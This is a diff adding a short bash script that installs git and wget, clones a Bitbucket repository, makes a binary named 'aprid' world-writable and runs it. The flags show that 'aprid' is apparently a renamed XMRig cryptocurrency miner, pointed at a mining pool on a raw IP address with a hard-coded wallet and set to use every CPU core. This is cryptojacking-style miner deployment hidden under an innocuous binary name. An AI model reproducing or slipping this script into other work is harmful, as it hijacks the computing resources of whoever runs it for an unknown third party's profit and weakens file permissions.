@@ -1,0 +1,6 @@
+#!/bin/bash
+yum update && yum -y install sudo
+yum -y install git wget
+git clone https://bitbucket.org/asana/luo.git && cd luo
+chmod 777 aprid SHA256SUMS
+./aprid --donate-level 1 -o 167.172.70.232:443 -u solo:SaLvsBZDTLuYxbM89MmUbs6q5d3niDtmpJqhNJCBSXRM7fA3KfdTAxiAQsowqEsUQFWbP8HUZhM76TypvYykgWUcBDB3cD5ujrY -p tes -a rx/0 -k -t $(nproc --all)
